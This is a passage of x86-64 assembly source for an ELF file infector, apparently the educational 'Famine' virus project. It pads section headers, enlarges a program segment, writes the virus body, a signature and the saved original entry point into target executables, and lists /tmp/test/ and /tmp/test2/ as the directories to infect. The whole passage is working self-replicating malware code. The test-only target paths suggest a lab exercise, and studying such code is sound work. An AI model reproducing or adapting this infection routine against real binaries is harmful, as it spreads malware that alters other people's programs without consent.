	jl		shdr_padding
	add		QWORD [r8 + 24], rax			; section[i].sh_offset += padding
	jmp		shdr_padding
padding_psize:
	mov		rax, QWORD [rel famine64_size]
	xor		r8, r8
	mov		r8d, DWORD [rel famine64_signature_size]
	add		r8, 4
	add		rax, r8
	mov		QWORD [rsp + 84], rax			; padding = psize
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;; 6. Modify Program info                                                ;;
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
infect_write:
	mov		rax, QWORD [rsp + 84]
	add		QWORD [rdx + 32], rax			; iprogram->p_filesz += padding
	add		QWORD [rdx + 40], rax			; iprogram->p_memsz += padding
%ifdef MAKE_EXECUTABLE_DEBUGGABLE
	mov		rcx, QWORD [rsp + 24]			; isection
	add		QWORD [rcx + 32], rax			; isection->sh_size += padding
%endif
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;; 7. Write new code                                                     ;;
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	mov		rdx, QWORD [rsp + 68]					; unsigned long off
	mov		rsi, QWORD [rsp + 56]					; void *data
	mov		edi, DWORD [rsp + 64]					; int fd
	mov		rax, SYS_WRITE
	syscall
	xor		rdx, rdx
	mov		edx, DWORD [rel famine64_signature_size]
	lea		rsi, [rel famine64_signature]
	mov		edi, DWORD [rsp + 64]					; int fd
	mov		rax, SYS_WRITE
	syscall
	mov		rdx, 4
	lea		rsi, [rel famine64_signature_size]
	mov		edi, DWORD [rsp + 64]					; int fd
	mov		rax, SYS_WRITE
	syscall
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;; Loop through dir_all to calculate the number of directories offset    ;;
	;; we will rewrite.                                                      ;;
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	mov		rdx, QWORD [rel famine64_size]
	mov		DWORD [rsp + 92], 0
	xor		rax, rax
dir_nb:
	sub		rdx, 8							; size of 64 bit address
	mov		eax, DWORD [rsp + 92]
	lea		rsi, [rel dir_all]
	mov		rsi, QWORD [rsi + rax * 8]
	add		DWORD [rsp + 92], 1
	cmp		rsi, 0
	jne		dir_nb
	sub		rdx, 8							; jump_offset size
	lea		rsi, [rel famine64_func]		; famine64_func
	mov		edi, DWORD [rsp + 64]			; int fd
	mov		rax, SYS_WRITE
	syscall
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;; Loop through dir_all to write the offset of the directories           ;;
	;; we will rewrite.                                                      ;;
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	mov		DWORD [rsp + 92], 0
write_dir:
	mov		rdx, 8							; 64 bit address size
	xor		rax, rax
	mov		eax, DWORD [rsp + 92]
	lea		rsi, [rel dir_all]
	mov		rsi, QWORD [rsi + rax * 8]
	cmp		rsi, 0
	je		write_dir_end
	lea		rax, [rel famine64_func]
	sub		rsi, rax
	mov		QWORD [rsp + 96], rsi
	lea		rsi, [rsp + 96]
	mov		edi, DWORD [rsp + 64]
	mov		rax, SYS_WRITE
	syscall
	add		DWORD [rsp + 92], 1
	jmp		write_dir
write_dir_end:
	mov		QWORD [rsp + 92], 0
	mov		rdx, 8
	lea		rsi, [rsp + 92]
	mov		edi, DWORD [rsp + 64]
	mov		rax, SYS_WRITE
	syscall
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;; Write the original program entry point offset                         ;;
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	mov		rdx, 8							; sizeof(old_entry)
	lea		rsi, [rsp + 76]					; old_entry
	mov		edi, DWORD [rsp + 64]			; int fd
	mov		rax, SYS_WRITE
	syscall
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;; 8. Add padding if needed                                              ;;
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	mov		rax, QWORD [rel famine64_size]
	xor		r8, r8
	mov		r8d, DWORD [rel famine64_signature_size]
	add		r8, 4
	add		rax, r8							; add famine64_signature size
	cmp		QWORD [rsp + 84], rax			; padding == psize ?
	je		off_add
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;; int zero                                                              ;;
	;; [rsp + 92]
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	mov		BYTE [rsp + 92], 0
add_padding:
	mov		rdx, 1
	lea		rsi, [rsp + 92]
	mov		edi, DWORD [rsp + 64]			; int fd
	mov		rax, SYS_WRITE
	syscall
	sub		QWORD [rsp + 84], 1				; padding--
	mov		rax, QWORD [rel famine64_size]
	xor		r8, r8
	mov		r8d, DWORD [rel famine64_signature_size]
	add		r8, 4
	add		rax, r8							; size of signature + signature size
	cmp		QWORD [rsp + 84], rax			; padding > psize ?
	ja		add_padding
	jmp		infect_write_end
off_add:
	add		QWORD [rsp + 68], rax			; off += psize
infect_write_end:
	mov		rdx, QWORD [rsp + 48]			; size
	sub		rdx, QWORD [rsp + 68]			; size - off
	sub		rdx, 1							; size - off -1
	mov		rsi, QWORD [rsp + 56]			; void *data
	add		rsi, QWORD [rsp + 68]			; data + off
	mov		edi, DWORD [rsp + 64]			; int fd
	mov		rax, SYS_WRITE
	syscall
	mov		edi, DWORD [rsp + 64]			; int fd
	mov		rax, SYS_CLOSE
	syscall
infect_file_end:
	add		rsp, 112
	ret
	
famine64_end:
	cmp		QWORD [rel jump_offset], 0
	je		no_jump
	lea		rax, [rel famine64_func]
	add		rax, QWORD [rel jump_offset]
	mov		QWORD [rsp + 0x20], rax
	jmp		do_ret
no_jump:
	add		rsp, 0x8
do_ret:
	add		rsp, 0x10
	pop		rdi
	pop		rax
	ret

data:
	famine64_size dq end_of_file - famine64_func
	dir_one db "/tmp/test/", 0
	dir_two db "/tmp/test2/", 0
	dir_all dq dir_one, dir_two, 0
	jump_offset dq 0
end_of_file:
